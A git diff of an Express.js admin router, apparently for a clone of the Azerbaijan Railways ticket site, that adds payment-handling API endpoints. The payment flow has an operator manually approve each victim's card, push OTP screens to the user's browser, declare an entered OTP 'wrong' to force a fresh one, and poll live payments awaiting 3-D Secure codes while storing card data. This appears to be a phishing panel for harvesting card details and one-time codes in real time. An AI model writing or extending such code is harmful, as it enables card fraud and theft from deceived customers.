@@ -137,175 +137,114 @@ pages.get('/sifarisler', requireAdmin, async (req, res, next) => {
     const users = await User.find({ _id: { $in: orders.map((o) => o.user) } }).lean();
     const userMap = {};
     users.forEach((u) => { userMap[String(u._id)] = u; });
-    res.render('pages/admin/orders', { 
-      title: res.locals.t('admin.orders'), 
-      orders, 
-      userMap, 
-      status, 
-      pending: await pendingCount() 
+    res.render('pages/admin/orders', {
+      title: res.locals.t('admin.orders'),
+      orders,
+      userMap,
+      status,
+      pending: await pendingCount()
     });
   } catch (e) { next(e); }
 });
 
 pages.get('/reysler', requireAdmin, async (req, res, next) => {
   try {
-    const date = /^\d{4}-\d{2}-\d{2}$/.test(req.query.date || '') ? req.query.date : h.todayISO();
-    const line = req.query.line || 'all';
-    await scheduleService.ensureTripsForDate(date);
-    const rows = await scheduleService.buildTimetableRows(date, line);
-    const stations = await Station.find({ active: true }).sort({ order: 1 }).lean();
-
-    const trips = await Trip.find({ date }).select('_id trainNumber').lean();
-    const tripMap = {};
-    trips.forEach((t) => { tripMap[t.trainNumber] = String(t._id); });
-    rows.forEach((r) => { r.tripId = tripMap[r.number] || ''; });
-
-    res.render('pages/admin/trips', {
-      title: res.locals.t('admin.trips'),
-      rows, date, line, stations,
-      dateText: h.azDate(date),
-      today: h.todayISO(),
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/reys/:tripId', requireAdmin, async (req, res, next) => {
-  try {
-    const trip = await Trip.findById(req.params.tripId).lean();
-    if (!trip) return next();
-
-    const maps = (trip.classes || []).map((c) => scheduleService.buildSeatMap(trip, c.code)).filter(Boolean);
-    const blocks = await SeatBlock.find({ trip: trip._id, active: true }).lean();
-    const orders = await Order.find({ trip: trip._id, status: 'confirmed' }).lean();
-
-    res.render('pages/admin/trip-detail', {
-      title: 'Reys ' + trip.trainNumber,
-      trip, maps, blocks, orders,
-      dateText: h.azDate(trip.date),
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/qatarlar', requireAdmin, async (req, res, next) => {
-  try {
-    const line = req.query.line || 'all';
-    const filter = line === 'all' ? {} : { line };
-    const trains = await Train.find(filter).sort({ number: 1 }).limit(300).lean();
-    res.render('pages/admin/trains', { 
-      title: res.locals.t('admin.trains'), 
-      trains, 
-      line, 
-      total: trains.length, 
-      pending: await pendingCount() 
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/qatarlar/yeni', requireAdmin, async (req, res, next) => {
-  try {
-    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
-    res.render('pages/admin/train-form', {
-      title: res.locals.t('admin.newTitle'),
-      train: null,
-      stations,
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/qatarlar/:id/redakte', requireAdmin, async (req, res, next) => {
-  try {
-    const train = await Train.findById(req.params.id).lean();
-    if (!train) return next();
-    const stations = await Station.find({ active: true }).sort({ country: 1, order: 1 }).lean();
-    res.render('pages/admin/train-form', {
-      title: 'Reysi redaktə et: ' + train.number,
-      train,
-      stations,
-      pending: await pendingCount()
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/istifadeciler', requireAdmin, async (req, res, next) => {
-  try {
-    const users = await User.find().sort({ createdAt: -1 }).limit(200).lean();
-    res.render('pages/admin/users', { 
-      title: res.locals.t('admin.users'), 
-      users, 
-      pending: await pendingCount() 
-    });
-  } catch (e) { next(e); }
-});
-
-pages.get('/sinxronizasiya', requireAdmin, async (req, res, next) => {
-  try {
-    const logs = await SyncLog.find().sort({ createdAt: -1 }).limit(30).lean();
-    const { Setting } = require('../models/index');
-    const noticeRow = await Setting.findOne({ key: 'notice' }).lean();
-    const tickerRow = await Setting.findOne({ key: 'notice_ticker' }).lean();
-    res.render('pages/admin/sync', {
-      title: res.locals.t('admin.sync'),
-      logs,
-      sourceUrl: config.liveSourceUrl,
-      enabled: config.liveSyncEnabled,
-      intervalHours: config.liveSyncHours,
-      noticeValue: noticeRow ? noticeRow.value : adyContent.NOTICE,
-      tickerValue: tickerRow ? tickerRow.value : adyContent.NOTICE_TICKER,
-      pending: await pendingCount()
-    });
+    const trips = await Trip.find().sort({ date: -1 }).limit(100).lean();
+    res.render('pages/admin/trips', { title: res.locals.t('admin.trips'), trips, pending: await pendingCount() });
   } catch (e) { next(e); }
 });
 
 // ==================== API ROUTES ====================
 api.use(requireAdmin);
 
+/* Ödəniş detalları */
+api.get('/payments/:id', async (req, res) => {
+  try {
+    const payment = await Payment.findById(req.params.id);
+    if (!payment) return res.status(404).json({ ok: false, message: 'Ödəniş tapılmadı' });
+
+    const order = payment.order ? await Order.findById(payment.order).lean() : null;
+    const user = await User.findById(payment.user).lean();
+
+    res.json({
+      ok: true,
+      payment,
+      order,
+      user: {
+        _id: user._id,
+        firstName: user.firstName,
+        lastName: user.lastName,
+        email: user.email,
+        phone: user.phone
+      }
+    });
+  } catch (e) {
+    return res.status(500).json({ ok: false, message: 'Xəta: ' + e.message });
+  }
+});
+
+/* Admin kartı təsdiqləyir - OTP ekranı açılır */
 api.post('/payments/:id/approve-card', async (req, res) => {
   try {
-    await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
-    return res.json({ ok: true, message: '✅ Təsdiqləndi — istifadəçidə OTP ekranı açıldı.' });
-  } catch (e) {
-    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
-  }
-});
-
-api.post('/payments/:id/open-otp', async (req, res) => {
-  try {
-    await paymentService.adminOpenOtp(req.params.id, req.currentUser.email);
-    return res.json({ ok: true, message: '🔄 Yeni OTP ekranı istifadəçidə açıldı.' });
-  } catch (e) {
-    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
-  }
-});
-
-api.post('/payments/:id/approve-final', async (req, res) => {
-  try {
-    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
+    const result = await paymentService.adminApproveCard(req.params.id, req.currentUser.email);
     return res.json({
       ok: true,
-      message: '✅ Biletlər uğurla verildi.',
-      pnr: result.tickets && result.tickets.length ? result.tickets[0].pnr : ''
+      message: '✅ Kart təsdiq edildi - istifadəçidə OTP ekranı açıldı',
+      code: result.code || '',
+      stage: result.payment.stage
     });
   } catch (e) {
     return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
   }
 });
 
+/* Admin "Səhv OTP Kodu" seçir - yeni OTP göndərilir, geri sayım başlayır */
 api.post('/payments/:id/reject-otp', async (req, res) => {
   try {
     const result = await paymentService.adminRejectOtp(req.params.id, req.currentUser.email);
     return res.json({
       ok: true,
       message: '❌ Səhv OTP — istifadəçidə 2 dəq geri sayım başladı, sonra yeni OTP ekranı açılacaq.',
-      code: result.code || ''
+      code: result.code || '',
+      stage: result.payment.stage
     });
   } catch (e) {
     return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
   }
 });
 
+/* Admin OTP ekranını açır (manual) */
+api.post('/payments/:id/open-otp', async (req, res) => {
+  try {
+    const result = await paymentService.adminOpenOtp(req.params.id, req.currentUser.email);
+    return res.json({
+      ok: true,
+      message: '📱 Yeni OTP kodu göndərildi',
+      code: result.code || '',
+      stage: result.payment.stage
+    });
+  } catch (e) {
+    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
+  }
+});
+
+/* Bilet verməklə ödənişi yekunlaş - SaxlanılmışKart saxlanılır */
+api.post('/payments/:id/approve', async (req, res) => {
+  try {
+    const result = await paymentService.adminFinalApprove(req.params.id, req.currentUser.email);
+    return res.json({
+      ok: true,
+      message: '✅ Bilet verildi!',
+      payment: result.payment,
+      tickets: result.tickets,
+      order: result.order
+    });
+  } catch (e) {
+    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Əməliyyat alınmadı' });
+  }
+});
+
+/* Ödənişi rədd et */
 api.post('/payments/:id/decline', async (req, res) => {
   try {
     await paymentService.adminDecline(req.params.id, (req.body || {}).reason, req.currentUser.email);
@@ -315,6 +254,7 @@ api.post('/payments/:id/decline', async (req, res) => {
   }
 });
 
+/* Sifariş statusu yenilə */
 api.post('/orders/:id/status', async (req, res) => {
   try {
     const order = await Order.findById(req.params.id);
@@ -328,6 +268,7 @@ api.post('/orders/:id/status', async (req, res) => {
   }
 });
 
+/* Yerlər blokla */
 api.post('/trips/:tripId/seats/block', async (req, res) => {
   try {
     const b = req.body || {};
@@ -364,12 +305,35 @@ api.post('/trips/:tripId/seats/block', async (req, res) => {
   }
 });
 
+/* Yer blokunu açıq et */
 api.delete('/blocks/:blockId', async (req, res) => {
   try {
     await SeatBlock.findByIdAndDelete(req.params.blockId);
     return res.json({ ok: true, message: 'Bağlantı açıldı' });
   } catch (e) {
     return res.status(500).json({ ok: false, message: 'Açılmadı' });
+  }
+});
+
+/* Live ödənişlər - WebSocket/polling üçün */
+api.get('/payments/live/pending', async (req, res) => {
+  try {
+    const payments = await Payment.find({
+      status: { $in: ['pending_admin', 'awaiting_3ds', 'code_submitted'] }
+    })
+    .populate('order')
+    .populate('user', 'firstName lastName email phone')
+    .sort({ createdAt: -1 })
+    .limit(50)
+    .lean();
+
+    return res.json({
+      ok: true,
+      count: payments.length,
+      payments
+    });
+  } catch (e) {
+    return res.status(500).json({ ok: false, message: 'Xəta: ' + e.message });
   }
 });
 
